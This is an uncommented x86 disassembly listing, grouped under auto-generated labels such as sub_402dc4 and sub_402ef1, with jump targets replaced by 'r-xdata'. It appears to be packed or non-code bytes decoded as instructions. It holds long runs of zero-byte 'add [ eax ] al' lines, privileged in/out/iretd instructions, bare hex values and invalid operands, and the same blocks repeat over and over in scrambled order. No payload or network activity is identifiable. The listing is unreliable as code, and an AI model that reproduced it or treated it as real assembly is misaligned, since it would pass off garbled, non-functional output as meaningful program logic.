jne r-xdata
and edx 0x83519c54
in al dx
or al 0xe8
iretd
jae r-xdata
mov ebp 0x64f37759
mov eax [ 0xffffffffc9812675 ]
xor ecx 0x4ce85251
add [ eax ] al
add [ ecx - 0x7a17a91e ] al
add [ eax ] eax
add [ edi ] cl
sbb [ ecx + 0xf ] 0x81
mov [ 0xf000000 ] al
push esp
push eax
call sub_402f74
xor edi 0x5f795958
jge r-xdata
add [ eax ] al
add [ edi ] cl
xchg [ edi - 0x30 ] bh
mov esp 0x11b8f0f
add [ eax ] al
sub ecx 0x8199755a
neg [ eax + 0x59 ]
jns r-xdata
xor esi 0xac810f59
jg 0xffffffffff53b47f
push esp
pushfd
push ecx
sub esp 0xc
call sub_402ef1
mov [ fs : 0xffffffff870f5a59 ] eax
lodsd [ esi ]
add [ eax ] al
add [ esi + 0x790cc483 ] bh
iretd
or edi 0x80c481
add [ eax ] al
retn
sub_402dc4
jne r-xdata
add esp 0x8
jg 0xf44f253
jae r-xdata
ja 0xffffffffa3c33c60
xchg [ esi - 0x1 ] eax
jae r-xdata
sub ecx 0xfeea830f
add [ eax ] al
add [ edi ] cl
test [ edi + 0x75 ] bh
add esp 0x8
jne r-xdata
add ebx 0xab810f
add [ eax ] al
xor al [ ecx ]
add [ eax ] al
jae r-xdata
mov ebp 0x478f0f5a
jae r-xdata
and esi 0x89641273
jg r-xdata
ja 0xffffffffff9baf1d
pop eax
pop eax
pop edx
jne r-xdata
call 0xf48f180
lea eax [ ecx + 0x1 ]
add [ eax ] al
jg r-xdata
jpo 0xdeb246
jno r-xdata
and ebx 0x870f4975
jae r-xdata
or edx 0x54549c55
call sub_402e2c
jb 0xffffffff81b2aae2
push ebp
pushfd
push esp
push esp
call [ 0xffffffffe9816c73 ]
add [ eax ] al
jae r-xdata
xor esi 0xe681cd75
jne r-xdata
mov [ fs : ebp + 0x19 ] esi
loope r-xdata
ja r-xdata
and ebx 0xe381c67f
jne r-xdata
pop ecx
pop ecx
jne r-xdata
jo 0x7ff936be
add esp 0x4
jae r-xdata
jl 0xf3aff8
jg r-xdata
les eax [ edi + ecx ]
jae r-xdata
js 0x7548f27a
jg r-xdata
ja 0xcab076
pop ecx
pop ecx
jns r-xdata
add edx 0xc1870f58
sub eax 0x6c7315ff
pop eax
jg r-xdata
jge 0xffffffff894f86f1
add [ eax ] al
pop edx
jge r-xdata
jo 0xffffffff854f876f
pop eax
jae r-xdata
and esi 0xc2817577
jno r-xdata
ja r-xdata
xor ecx 0x30870f59
add [ eax ] eax
add [ edi ] cl
xor [ ebx + 0x7a ] 0xffffffe8
or bh [ ebp + 0x478f0f5a ]
jno r-xdata
js 0x7f44f235
add [ eax ] al
add esi 0x83575554
in al dx
add al 0xe8
dec ecx
ja r-xdata
jno 0xffffffffe891818e
push 0x81ffffff
out 0x77 al
jne r-xdata
pop edx
jg r-xdata
and [ edx + 0xf000000 ] 0xffffff8d
and ecx 0xf04c483
add esp 0x4
jg r-xdata
je 0xffffffff804fa290
pop eax
ja r-xdata
xor edx 0x880f5e7f
jge r-xdata
add edx 0xbf810f
add [ eax ] al
jno r-xdata
call [ 0xfbf3f7f ]
lea ebx [ eax ]
sbb [ edi ] ecx
mov [ edi ] cs
pop ecx
ja r-xdata
xor eax 0xfef4870f
cmp edi 0xffffffff
inc [ ecx + 0x1a830ff3 ]
out dx eax
retn 0x810f
jae r-xdata
and edx 0xff53830f
add esp 0x4
ja r-xdata
jl 0xffffffffffacbcc8
pop edx
pop edx
jne r-xdata
jne r-xdata
sub edi 0x64244481
inc ecx
xor eax [ eax ]
jne r-xdata
mov eax 0xfeef890f
jns r-xdata
sub eax 0x755a5858
mov ah 0x81
0x9c55
jno r-xdata
jae 0xffffffff8428a76d
pop ecx
jno r-xdata
mov ecx 0x15ff2d7f
jge r-xdata
jae r-xdata
or ecx 0xf18d0f
add [ eax ] al
pop eax
pop ecx
jne r-xdata
mov [ fs : edi ] ecx
test [ eax - 0x47000000 ] edi
jne r-xdata
push esp
push ebp
push edi
sub esp 0x4
call sub_402cd2
jae 0xffffffffff43b4f7
xor ecx 0x890fd079
or esi 0xff24810f
jae r-xdata
je 0xffffffffff6db33f
jge r-xdata
les ecx [ eax ]
jae r-xdata
sub ecx 0x92810f59
add [ eax ] al
add [ ecx - 0x7e39801d ] al
jecxz r-xdata
jg r-xdata
sub edi 0xf681b871
jne r-xdata
jns r-xdata
sub ebx 0xe8525452
insb
ja r-xdata
sub ebx 0xec835656
adc al ch
jpe r-xdata
push esi
call sub_403035
xor esi 0x72870f59
add [ eax ] eax
add [ esp + edx * 2 + 0xd5e850 ] bh
add [ eax ] al
sub esp 0x28
pop ecx
pop edx
jne r-xdata
add [ esp + 0x64 ] r-xdata
sub ebx 0xff2f850f
push edx
push esp
push edx
call sub_402cc7
sub ecx 0x850f5959
das
mov edi 0xff188d0f
jns 0x158b252
pop ecx
jno r-xdata
sub esi 0xf58595a
sub [ edi - 0x1 ] 0xffffffff
inc [ ecx - 0x70f0a53a ]
add [ eax ] 0x0
add [ ebx + 0x71 ] ah
insd
xchg [ edi ] cl
add [ eax ] al
add [ edi ] cl
add [ eax ] al
pop ecx
jno r-xdata
call 0xf44f4a9
and [ ecx - 0x2 ] 0xffffffff
inc [ ecx - 0x1b72f03e ]
pop ecx
jne r-xdata
jbe 0xffcff74
jno r-xdata
jge 0xffffffffffa0b2b3
jge r-xdata
jpe 0x74cd3eb7
ja r-xdata
and eax 0x4c48358
push eax
pushfd
add ebx 0xdc7f585a
pop ecx
jno r-xdata
and edi 0x800fae73
pop eax
pop ecx
jns r-xdata
push edi
call sub_402f24
jg 0xfffffffff0b3894b
add edx 0xc381ea77
pop edx
pop eax
jg r-xdata
jno r-xdata
add esp 0x4
pop eax
jge r-xdata
jbe 0x133bdce
pop edx
jg r-xdata
mov [ fs : 0x15ffe47d ] eax
add eax 0x4c4835a
jae r-xdata
jae r-xdata
jo 0x58662447
ja r-xdata
add edi 0xff74830f
add [ eax ] al
jno 0xf9a8921
jae r-xdata
mov [ fs : 0xffffffff8a0f6d71 ] eax
jae r-xdata
call 0xffffffff854f895b
xor al 0xff
pop ecx
ja r-xdata
jge 0xffffffff9c95cbfc
jo 0xffffffffa2c13e0f
push ecx
push edx
call sub_402ef4
and edx 0x185e856
add [ eax ] al
jl 0xffffffffc1c16251
push edx
call sub_402e90
and esi 0xe981dd73
pushfd
push edi
pushfd
call sub_402f0b
jo 0xff9a4f8
jo 0xffffffff894f8935
jge r-xdata
add ecx 0x870f5859
inc edi
add [ eax ] eax
add [ ecx - 0x7ef0a60a ] al
lodsb [ esi ]
pop edx
jne r-xdata
mov eax [ fs : 0xffffffffc9812675 ]
push esi
call sub_402ece
and edi 0x850fc67f
pop ecx
pop eax
ja r-xdata
push ebp
pushfd
lea ecx [ edi ]
and [ eax - 0x1 ] 0xffffffff
dec [ edi ]
lea edx [ eax - 0x64 ]
insd
jne r-xdata
and edx 0x83519c54
in al dx
or al 0xe8
iretd
jae r-xdata
mov ebp 0x64f37759
mov eax [ 0xffffffffc9812675 ]
xor ecx 0x4ce85251
add [ eax ] al
add [ ecx - 0x7a17a91e ] al
add [ eax ] eax
add [ edi ] cl
sbb [ ecx + 0xf ] 0x81
mov [ 0xf000000 ] al
push esp
push eax
call sub_402f74
xor edi 0x5f795958
jge r-xdata
add [ eax ] al
add [ edi ] cl
xchg [ edi - 0x30 ] bh
mov esp 0x11b8f0f
add [ eax ] al
sub ecx 0x8199755a
neg [ eax + 0x59 ]
jns r-xdata
xor esi 0xac810f59
jg 0xffffffffff53b47f
push esp
pushfd
push ecx
sub esp 0xc
call sub_402ef1
mov [ fs : 0xffffffff870f5a59 ] eax
lodsd [ esi ]
add [ eax ] al
add [ esi + 0x790cc483 ] bh
iretd
or edi 0x80c481
add [ eax ] al
retn
sub_402e2c
jne r-xdata
jne r-xdata
or ebx 0xfad7f58
adc [ ecx + 0x53 ] 0xff83e851
jg r-xdata
ja 0xcab076
jno r-xdata
js 0x7f44f235
add [ eax ] al
jno r-xdata
call [ 0xfbf3f7f ]
lea ebx [ eax ]
sbb [ edi ] ecx
mov [ edi ] cs
jns r-xdata
sub eax 0x755a5858
mov ah 0x81
0x9c55
pop edx
pop edx
jne r-xdata
or esi 0xff24810f
jae r-xdata
or ecx 0xf18d0f
add [ eax ] al
jns r-xdata
sub ebx 0xe8525452
insb
jae r-xdata
and esi 0x89641273
jg r-xdata
jns 0x158b252
pop eax
pop eax
pop edx
jne r-xdata
call 0xf48f180
lea eax [ ecx + 0x1 ]
add [ eax ] al
jg r-xdata
jpo 0xdeb246
pop edx
jge r-xdata
jo 0xffffffff854f876f
add [ eax ] al
jae r-xdata
or edx 0x54549c55
add [ eax ] al
add [ edi ] cl
test [ edi + 0x75 ] bh
call sub_402e2c
jb 0xffffffff81b2aae2
push ebp
pushfd
push esp
push esp
call [ 0xffffffffe9816c73 ]
add [ eax ] al
pop edx
jg r-xdata
and ecx 0xf04c483
xor al [ ecx ]
add [ eax ] al
sub eax 0x6c7315ff
jne r-xdata
mov [ fs : ebp + 0x19 ] esi
loope r-xdata
ja r-xdata
and ebx 0xe381c67f
pop ecx
pop ecx
jne r-xdata
jo 0x7ff936be
jae r-xdata
and edx 0xff53830f
pop eax
jae r-xdata
and esi 0xc2817577
jno r-xdata
add esi 0x83575554
in al dx
add al 0xe8
dec ecx
and [ edx + 0xf000000 ] 0xffffff8d
les eax [ edi + ecx ]
jae r-xdata
js 0x7548f27a
pop ecx
pop ecx
jns r-xdata
add edx 0xc1870f58
pop ecx
jno r-xdata
mov ecx 0x15ff2d7f
add esp 0x4
jg r-xdata
je 0xffffffff804fa290
pop eax
ja r-xdata
xor edx 0x880f5e7f
ja r-xdata
xor ecx 0x30870f59
add [ eax ] eax
add [ edi ] cl
xor [ ebx + 0x7a ] 0xffffffe8
add esp 0x8
or bh [ ebp + 0x478f0f5a ]
jae r-xdata
sub ecx 0x92810f59
add [ eax ] al
add [ ecx - 0x7e39801d ] al
jecxz r-xdata
add esp 0x4
ja r-xdata
jl 0xffffffffffacbcc8
jne r-xdata
sub edi 0x64244481
inc ecx
xor eax [ eax ]
jge r-xdata
add edx 0xbf810f
add [ eax ] al
jae r-xdata
ja 0xffffffffa3c33c60
sub esp 0x28
pop ecx
pop edx
jne r-xdata
add [ esp + 0x64 ] r-xdata
sub ebx 0xff2f850f
jge r-xdata
pop eax
pop ecx
jne r-xdata
mov [ fs : edi ] ecx
test [ eax - 0x47000000 ] edi
jne r-xdata
jne r-xdata
mov eax 0xfeef890f
jae r-xdata
sub ecx 0xfeea830f
jg r-xdata
sub edi 0xf681b871
jne r-xdata
ja r-xdata
sub ebx 0xec835656
adc al ch
jpe r-xdata
push esi
call sub_403035
xor esi 0x72870f59
add [ eax ] eax
add [ esp + edx * 2 + 0xd5e850 ] bh
add [ eax ] al
push esp
push ebp
push edi
sub esp 0x4
call sub_402cd2
jae 0xffffffffff43b4f7
xor ecx 0x890fd079
add esp 0x8
jne r-xdata
add ebx 0xab810f
add [ eax ] al
push edx
push esp
push edx
call sub_402cc7
sub ecx 0x850f5959
das
mov edi 0xff188d0f
pop ecx
jno r-xdata
sub esi 0xf58595a
sub [ edi - 0x1 ] 0xffffffff
inc [ ecx - 0x70f0a53a ]
add [ eax ] 0x0
add [ ebx + 0x71 ] ah
insd
xchg [ edi ] cl
add [ eax ] al
add [ edi ] cl
jae r-xdata
mov ebp 0x478f0f5a
pop ecx
jno r-xdata
call 0xf44f4a9
and [ ecx - 0x2 ] 0xffffffff
inc [ ecx - 0x1b72f03e ]
jg r-xdata
ja 0xffffffffff9baf1d
pop ecx
jne r-xdata
jbe 0xffcff74
jno r-xdata
and ebx 0x870f4975
jno r-xdata
jge 0xffffffffffa0b2b3
jae r-xdata
xor esi 0xe681cd75
jge r-xdata
jpe 0x74cd3eb7
add esp 0x4
jae r-xdata
jl 0xf3aff8
ja r-xdata
and eax 0x4c48358
pop eax
jg r-xdata
jge 0xffffffff894f86f1
add [ eax ] al
push eax
pushfd
add ebx 0xdc7f585a
pop ecx
jno r-xdata
and edi 0x800fae73
pop eax
pop ecx
jns r-xdata
ja r-xdata
jno 0xffffffffe891818e
push 0x81ffffff
out 0x77 al
jne r-xdata
push edi
call sub_402f24
jg 0xfffffffff0b3894b
add edx 0xc381ea77
pop edx
pop eax
jg r-xdata
jno r-xdata
add esp 0x4
pop eax
jge r-xdata
jbe 0x133bdce
pop edx
jg r-xdata
mov [ fs : 0x15ffe47d ] eax
pop ecx
ja r-xdata
xor eax 0xfef4870f
cmp edi 0xffffffff
inc [ ecx + 0x1a830ff3 ]
out dx eax
retn 0x810f
add eax 0x4c4835a
jae r-xdata
jae r-xdata
jo 0x58662447
ja r-xdata
add edi 0xff74830f
add [ eax ] al
jno 0xf9a8921
jae r-xdata
mov [ fs : 0xffffffff8a0f6d71 ] eax
jno r-xdata
jae 0xffffffff8428a76d
jae r-xdata
call 0xffffffff854f895b
xor al 0xff
pop ecx
ja r-xdata
jge 0xffffffff9c95cbfc
jo 0xffffffffa2c13e0f
push ecx
push edx
call sub_402ef4
and edx 0x185e856
add [ eax ] al
jl 0xffffffffc1c16251
push edx
call sub_402e90
and esi 0xe981dd73
pushfd
push edi
pushfd
call sub_402f0b
jo 0xff9a4f8
jo 0xffffffff894f8935
jae r-xdata
je 0xffffffffff6db33f
jge r-xdata
les ecx [ eax ]
jge r-xdata
add ecx 0x870f5859
inc edi
add [ eax ] eax
add [ ecx - 0x7ef0a60a ] al
lodsb [ esi ]
pop edx
jne r-xdata
mov eax [ fs : 0xffffffffc9812675 ]
push esi
call sub_402ece
and edi 0x850fc67f
pop ecx
pop eax
ja r-xdata
push ebp
pushfd
lea ecx [ edi ]
and [ eax - 0x1 ] 0xffffffff
dec [ edi ]
lea edx [ eax - 0x64 ]
insd
jne r-xdata
and edx 0x83519c54
in al dx
or al 0xe8
iretd
jae r-xdata
mov ebp 0x64f37759
mov eax [ 0xffffffffc9812675 ]
xor ecx 0x4ce85251
add [ eax ] al
add [ ecx - 0x7a17a91e ] al
add [ eax ] eax
add [ edi ] cl
sbb [ ecx + 0xf ] 0x81
mov [ 0xf000000 ] al
push esp
push eax
call sub_402f74
xor edi 0x5f795958
jge r-xdata
add [ eax ] al
add [ edi ] cl
xchg [ edi - 0x30 ] bh
mov esp 0x11b8f0f
add [ eax ] al
sub ecx 0x8199755a
neg [ eax + 0x59 ]
jns r-xdata
xor esi 0xac810f59
jg 0xffffffffff53b47f
push esp
pushfd
push ecx
sub esp 0xc
call sub_402ef1
mov [ fs : 0xffffffff870f5a59 ] eax
lodsd [ esi ]
add [ eax ] al
add [ esi + 0x790cc483 ] bh
iretd
or edi 0x80c481
add [ eax ] al
retn
sub_402e90
pop ecx
ja r-xdata
push esi
push esi
sub esp 0x10
call sub_402f8d
xor edi 0x810a7d58
0xf59
mov esp 0xd5e85054
add [ eax ] al
add [ ecx - 0x17adae0f ] al
dec esp
add [ eax ] al
add [ ecx - 0x7a17a91e ] al
add [ eax ] eax
add [ edi ] cl
sbb [ ecx + 0xf ] 0x81
mov [ 0xf000000 ] al
xchg [ edi ] cl
sub_402ece
jae r-xdata
pop edx
pop eax
jg r-xdata
xor ecx 0x8c0fc977
jae r-xdata
jo 0x58662447
jge r-xdata
add ecx 0x870f5859
inc edi
add [ eax ] eax
add [ ecx - 0x7ef0a60a ] al
lodsb [ esi ]
pop ecx
ja r-xdata
jge 0xffffffff9c95cbfc
add esp 0x4
jno r-xdata
jne r-xdata
and edx 0x83519c54
in al dx
or al 0xe8
iretd
jae r-xdata
mov ebp 0x64f37759
mov eax [ 0xffffffffc9812675 ]
pop edx
jne r-xdata
mov eax [ fs : 0xffffffffc9812675 ]
push esi
call sub_402ece
and edi 0x850fc67f
pop ecx
jno r-xdata
and edi 0x800fae73
pop eax
pop ecx
jns r-xdata
push edi
call sub_402f24
jg 0xfffffffff0b3894b
add edx 0xc381ea77
pop ecx
pop eax
ja r-xdata
jg 0xffffffffff53b47f
push esp
push eax
call sub_402f74
xor ecx 0x4ce85251
add [ eax ] al
add [ ecx - 0x7a17a91e ] al
add [ eax ] eax
add [ edi ] cl
sbb [ ecx + 0xf ] 0x81
mov [ 0xf000000 ] al
xor edi 0x5f795958
pop eax
jge r-xdata
jbe 0x133bdce
pop edx
jg r-xdata
mov [ fs : 0x15ffe47d ] eax
add eax 0x4c4835a
jae r-xdata
jge r-xdata
add [ eax ] al
add [ edi ] cl
xchg [ edi - 0x30 ] bh
mov esp 0x11b8f0f
add [ eax ] al
sub ecx 0x8199755a
neg [ eax + 0x59 ]
jns r-xdata
xor esi 0xac810f59
ja r-xdata
add edi 0xff74830f
add [ eax ] al
jno 0xf9a8921
jae r-xdata
mov [ fs : 0xffffffff8a0f6d71 ] eax
jae r-xdata
call 0xffffffff854f895b
xor al 0xff
push esp
pushfd
push ecx
sub esp 0xc
call sub_402ef1
mov [ fs : 0xffffffff870f5a59 ] eax
lodsd [ esi ]
add [ eax ] al
add [ esi + 0x790cc483 ] bh
iretd
or edi 0x80c481
add [ eax ] al
retn
push ecx
push edx
call sub_402ef4
and edx 0x185e856
add [ eax ] al
jo 0xffffffffa2c13e0f
jl 0xffffffffc1c16251
push edx
call sub_402e90
and esi 0xe981dd73
pushfd
push edi
pushfd
call sub_402f0b
jo 0xff9a4f8
jo 0xffffffff894f8935
xchg [ edi ] cl
add [ eax ] al
add [ edi ] cl
lea ecx [ edi ]
and [ eax - 0x1 ] 0xffffffff
dec [ edi ]
lea edx [ eax - 0x64 ]
push ebp
pushfd
insd
sub_402ef1
jg r-xdata
pop edx
pop edx
pop edx
jg r-xdata
mov esp 0x11b8f0f
add [ eax ] al
sub ecx 0x8199755a
neg [ eax + 0x59 ]
jns r-xdata
pop eax
pop ecx
jae r-xdata
or edx 0xec830f
add [ eax ] al
xor ecx 0x8c0fc977
jae r-xdata
mov ebp 0x64f37759
mov eax [ 0xffffffffc9812675 ]
jge r-xdata
add eax 0x4c4835a
jae r-xdata
jge r-xdata
add ecx 0x870f5859
inc edi
add [ eax ] eax
add [ ecx - 0x7ef0a60a ] al
lodsb [ esi ]
pop ecx
pop eax
ja r-xdata
jg 0xffffffffff53b47f
jne r-xdata
and edx 0x83519c54
in al dx
or al 0xe8
iretd
pop eax
call [ 0xffffffffff37e857 ]
jae r-xdata
call 0xffffffff854f895b
xor al 0xff
jge r-xdata
add [ eax ] al
add [ edi ] cl
xchg [ edi - 0x30 ] bh
xor esi 0xac810f59
push edi
call sub_402f24
jg 0xfffffffff0b3894b
add edx 0xc381ea77
pop edx
pop eax
jg r-xdata
pop ecx
jno r-xdata
and edi 0x800fae73
pop eax
pop ecx
jns r-xdata
push esp
pushfd
push ecx
sub esp 0xc
call sub_402ef1
mov [ fs : 0xffffffff870f5a59 ] eax
lodsd [ esi ]
add [ eax ] al
add [ esi + 0x790cc483 ] bh
iretd
or edi 0x80c481
add [ eax ] al
retn
jae r-xdata
jo 0x58662447
pop eax
jge r-xdata
jbe 0x133bdce
pop edx
jg r-xdata
mov [ fs : 0x15ffe47d ] eax
pop ecx
ja r-xdata
jge 0xffffffff9c95cbfc
add esp 0x4
jno r-xdata
ja r-xdata
add edi 0xff74830f
add [ eax ] al
jno 0xf9a8921
jae r-xdata
mov [ fs : 0xffffffff8a0f6d71 ] eax
pop edx
jne r-xdata
mov eax [ fs : 0xffffffffc9812675 ]
push esi
call sub_402ece
and edi 0x850fc67f
push ecx
push edx
call sub_402ef4
and edx 0x185e856
add [ eax ] al
jo 0xffffffffa2c13e0f
jl 0xffffffffc1c16251
push edx
call sub_402e90
and esi 0xe981dd73
pushfd
push edi
pushfd
call sub_402f0b
jo 0xff9a4f8
jo 0xffffffff894f8935
push esp
push eax
call sub_402f74
xor ecx 0x4ce85251
add [ eax ] al
add [ ecx - 0x7a17a91e ] al
add [ eax ] eax
add [ edi ] cl
sbb [ ecx + 0xf ] 0x81
mov [ 0xf000000 ] al
xor edi 0x5f795958
xchg [ edi ] cl
add [ eax ] al
add [ edi ] cl
lea ecx [ edi ]
and [ eax - 0x1 ] 0xffffffff
dec [ edi ]
lea edx [ eax - 0x64 ]
push ebp
pushfd
insd
sub_402ef4
jg r-xdata
pop eax
jge r-xdata
sub ecx 0x8199755a
neg [ eax + 0x59 ]
jns r-xdata
add esp 0x4
jae r-xdata
or edx 0xc7810f59
jae r-xdata
mov ebp 0x64f37759
mov eax [ 0xffffffffc9812675 ]
jne r-xdata
add edx 0xfee48d0f
pop ecx
pop eax
ja r-xdata
jg 0xffffffffff53b47f
jne r-xdata
and edx 0x83519c54
in al dx
or al 0xe8
iretd
push esi
call sub_403035
xor esi 0x72870f59
add [ eax ] eax
add [ esp + edx * 2 + 0xd5e850 ] bh
add [ eax ] al
jge r-xdata
xor esi 0xac810f59
push edi
call sub_402f24
jg 0xfffffffff0b3894b
add edx 0xc381ea77
pop edx
pop eax
jg r-xdata
xchg [ edi ] cl
add [ eax ] al
add [ edi ] cl
push esp
pushfd
push ecx
sub esp 0xc
call sub_402ef1
mov [ fs : 0xffffffff870f5a59 ] eax
lodsd [ esi ]
add [ eax ] al
add [ esi + 0x790cc483 ] bh
iretd
or edi 0x80c481
add [ eax ] al
retn
add eax 0x4c4835a
jae r-xdata
jae r-xdata
jo 0x58662447
jae r-xdata
call 0xffffffff854f895b
xor al 0xff
pop ecx
ja r-xdata
jge 0xffffffff9c95cbfc
add esp 0x4
jno r-xdata
jge r-xdata
add [ eax ] al
add [ edi ] cl
xchg [ edi - 0x30 ] bh
mov esp 0x11b8f0f
add [ eax ] al
add ecx 0x870f5859
inc edi
add [ eax ] eax
add [ ecx - 0x7ef0a60a ] al
lodsb [ esi ]
pop edx
jne r-xdata
mov eax [ fs : 0xffffffffc9812675 ]
push esi
call sub_402ece
and edi 0x850fc67f
pop ecx
jno r-xdata
and edi 0x800fae73
pop eax
pop ecx
jns r-xdata
xor ecx 0x4ce85251
add [ eax ] al
add [ ecx - 0x7a17a91e ] al
add [ eax ] eax
add [ edi ] cl
sbb [ ecx + 0xf ] 0x81
mov [ 0xf000000 ] al
push esp
push eax
call sub_402f74
xor edi 0x5f795958
pop eax
jge r-xdata
jbe 0x133bdce
pop edx
jg r-xdata
mov [ fs : 0x15ffe47d ] eax
ja r-xdata
add edi 0xff74830f
add [ eax ] al
jno 0xf9a8921
jae r-xdata
mov [ fs : 0xffffffff8a0f6d71 ] eax
jo 0xffffffffa2c13e0f
push ecx
push edx
call sub_402ef4
and edx 0x185e856
add [ eax ] al
jl 0xffffffffc1c16251
push edx
call sub_402e90
and esi 0xe981dd73
pushfd
push edi
pushfd
call sub_402f0b
jo 0xff9a4f8
jo 0xffffffff894f8935
lea ecx [ edi ]
and [ eax - 0x1 ] 0xffffffff
dec [ edi ]
lea edx [ eax - 0x64 ]
push ebp
pushfd
insd
sub_402f0b
jne r-xdata
jae r-xdata
or ecx 0xa38d0f
add [ eax ] al
pop edx
add esp 0x4
jns 0x119b64e
jae r-xdata
call 0xffffffff854f895b
xor al 0xff
add [ eax ] al
sub esi 0xf58595a
sub [ edi - 0x1 ] 0xffffffff
inc [ ecx - 0x70f0a53a ]
add [ eax ] 0x0
add [ ebx + 0x71 ] ah
insd
jpe 0x74cd3eb7
jge r-xdata
add ecx 0x870f5859
inc edi
add [ eax ] eax
add [ ecx - 0x7ef0a60a ] al
lodsb [ esi ]
jne r-xdata
and edx 0x83519c54
in al dx
or al 0xe8
iretd
jae r-xdata
mov ebp 0x64f37759
mov eax [ 0xffffffffc9812675 ]
push edi
call sub_402f24
jg 0xfffffffff0b3894b
add edx 0xc381ea77
pop edx
pop eax
jg r-xdata
pop ecx
pop eax
ja r-xdata
jg 0xffffffffff53b47f
jae r-xdata
add eax 0x4c4835a
jae r-xdata
jo 0x58662447
jge r-xdata
add [ eax ] al
add [ edi ] cl
xchg [ edi - 0x30 ] bh
mov esp 0x11b8f0f
add [ eax ] al
sub ecx 0x8199755a
neg [ eax + 0x59 ]
jns r-xdata
xor esi 0xac810f59
pop ecx
ja r-xdata
jge 0xffffffff9c95cbfc
add esp 0x4
jno r-xdata
push esp
pushfd
push ecx
sub esp 0xc
call sub_402ef1
mov [ fs : 0xffffffff870f5a59 ] eax
lodsd [ esi ]
add [ eax ] al
add [ esi + 0x790cc483 ] bh
iretd
or edi 0x80c481
add [ eax ] al
retn
pop edx
jne r-xdata
mov eax [ fs : 0xffffffffc9812675 ]
push esi
call sub_402ece
and edi 0x850fc67f
pop ecx
jno r-xdata
and edi 0x800fae73
pop eax
pop ecx
jns r-xdata
push esp
push eax
call sub_402f74
xor ecx 0x4ce85251
add [ eax ] al
add [ ecx - 0x7a17a91e ] al
add [ eax ] eax
add [ edi ] cl
sbb [ ecx + 0xf ] 0x81
mov [ 0xf000000 ] al
xor edi 0x5f795958
pop eax
jge r-xdata
jbe 0x133bdce
pop edx
jg r-xdata
mov [ fs : 0x15ffe47d ] eax
ja r-xdata
add edi 0xff74830f
add [ eax ] al
jno 0xf9a8921
jae r-xdata
mov [ fs : 0xffffffff8a0f6d71 ] eax
push ecx
push edx
call sub_402ef4
and edx 0x185e856
add [ eax ] al
jo 0xffffffffa2c13e0f
jl 0xffffffffc1c16251
push edx
call sub_402e90
and esi 0xe981dd73
pushfd
push edi
pushfd
call sub_402f0b
jo 0xff9a4f8
jo 0xffffffff894f8935
xchg [ edi ] cl
add [ eax ] al
add [ edi ] cl
lea ecx [ edi ]
and [ eax - 0x1 ] 0xffffffff
dec [ edi ]
lea edx [ eax - 0x64 ]
push ebp
pushfd
insd
sub_402f24
pop ecx
pop edx
ja r-xdata
pop eax
pop ecx
jns r-xdata
mov esi 0x790cc483
pop edx
jg r-xdata
mov [ fs : 0x15ffe47d ] eax
jae r-xdata
mov [ fs : 0xffffffff8a0f6d71 ] eax
add eax 0x4c4835a
jae r-xdata
push edx
call sub_402e90
and esi 0xe981dd73
pushfd
push edi
pushfd
call sub_402f0b
jo 0xff9a4f8
jo 0xffffffff894f8935
ja r-xdata
add edi 0xff74830f
jae r-xdata
call 0xffffffff854f895b
xor al 0xff
lea ecx [ edi ]
and [ eax - 0x1 ] 0xffffffff
dec [ edi ]
lea edx [ eax - 0x64 ]
push ebp
pushfd
insd
push ecx
push edx
call sub_402ef4
and edx 0x185e856
add [ eax ] al
jo 0xffffffffa2c13e0f
jl 0xffffffffc1c16251
jge r-xdata
add ecx 0x870f5859
inc edi
add [ eax ] eax
add [ ecx - 0x7ef0a60a ] al
lodsb [ esi ]
push edi
call sub_402f24
jg 0xfffffffff0b3894b
add edx 0xc381ea77
pop edx
pop eax
jg r-xdata
add [ eax ] al
add [ edi ] cl
pop ecx
pop eax
ja r-xdata
jne r-xdata
and edx 0x83519c54
in al dx
or al 0xe8
iretd
jae r-xdata
mov ebp 0x64f37759
mov eax [ 0xffffffffc9812675 ]
jae r-xdata
jo 0x58662447
jge r-xdata
add [ eax ] al
add [ edi ] cl
xchg [ edi - 0x30 ] bh
mov esp 0x11b8f0f
add [ eax ] al
sub ecx 0x8199755a
neg [ eax + 0x59 ]
jns r-xdata
xor esi 0xac810f59
jg 0xffffffffff53b47f
pop ecx
ja r-xdata
jge 0xffffffff9c95cbfc
add esp 0x4
jno r-xdata
iretd
push esp
pushfd
push ecx
sub esp 0xc
call sub_402ef1
mov [ fs : 0xffffffff870f5a59 ] eax
lodsd [ esi ]
add [ eax ] al
add [ esi + 0x790cc483 ] bh
or edi 0x80c481
add [ eax ] al
retn
pop edx
jne r-xdata
mov eax [ fs : 0xffffffffc9812675 ]
push esi
call sub_402ece
and edi 0x850fc67f
pop ecx
jno r-xdata
and edi 0x800fae73
xchg [ edi ] cl
push esp
push eax
call sub_402f74
xor ecx 0x4ce85251
add [ eax ] al
add [ ecx - 0x7a17a91e ] al
add [ eax ] eax
add [ edi ] cl
sbb [ ecx + 0xf ] 0x81
mov [ 0xf000000 ] al
xor edi 0x5f795958
pop eax
jge r-xdata
jbe 0x133bdce
add [ eax ] al
jno 0xf9a8921
sub_402f2d
add esp 0xc
jns r-xdata
pop eax
pop ecx
sub eax 0xbb830f
add [ eax ] al
jns 0x119b64e
jae r-xdata
mov ebp 0x64f37759
mov eax [ 0xffffffffc9812675 ]
add [ eax ] al
sub esi 0xf58595a
sub [ edi - 0x1 ] 0xffffffff
inc [ ecx - 0x70f0a53a ]
add [ eax ] 0x0
add [ ebx + 0x71 ] ah
insd
jpe 0x74cd3eb7
pop ecx
pop eax
ja r-xdata
jg 0xffffffffff53b47f
jne r-xdata
and edx 0x83519c54
in al dx
or al 0xe8
iretd
jge r-xdata
jns r-xdata
xor esi 0xac810f59
push edi
call sub_402f24
jg 0xfffffffff0b3894b
add edx 0xc381ea77
pop edx
pop eax
jg r-xdata
push esp
pushfd
push ecx
sub esp 0xc
call sub_402ef1
mov [ fs : 0xffffffff870f5a59 ] eax
lodsd [ esi ]
add [ eax ] al
add [ esi + 0x790cc483 ] bh
iretd
or edi 0x80c481
add [ eax ] al
retn
add eax 0x4c4835a
jae r-xdata
jae r-xdata
jo 0x58662447
jae r-xdata
call 0xffffffff854f895b
xor al 0xff
pop ecx
ja r-xdata
jge 0xffffffff9c95cbfc
add esp 0x4
jno r-xdata
jge r-xdata
add [ eax ] al
add [ edi ] cl
xchg [ edi - 0x30 ] bh
mov esp 0x11b8f0f
add [ eax ] al
sub ecx 0x8199755a
neg [ eax + 0x59 ]
add ecx 0x870f5859
inc edi
add [ eax ] eax
add [ ecx - 0x7ef0a60a ] al
lodsb [ esi ]
pop edx
jne r-xdata
mov eax [ fs : 0xffffffffc9812675 ]
push esi
call sub_402ece
and edi 0x850fc67f
pop ecx
jno r-xdata
and edi 0x800fae73
pop eax
